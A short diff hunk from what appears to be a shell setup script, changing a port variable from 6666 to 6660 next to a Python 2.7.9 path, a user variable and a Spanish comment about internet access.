@@ -14,7 +14,7 @@ PYTHON279_PREFIX=/usr/local/lib/
 PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python
 
 RAT_USER=manavi
-SPORT=6666
+SPORT=6660
 
 #Comprobar que ya no es necesaria la conexión a internet
 if [ ! -f $PYTHON279 ]
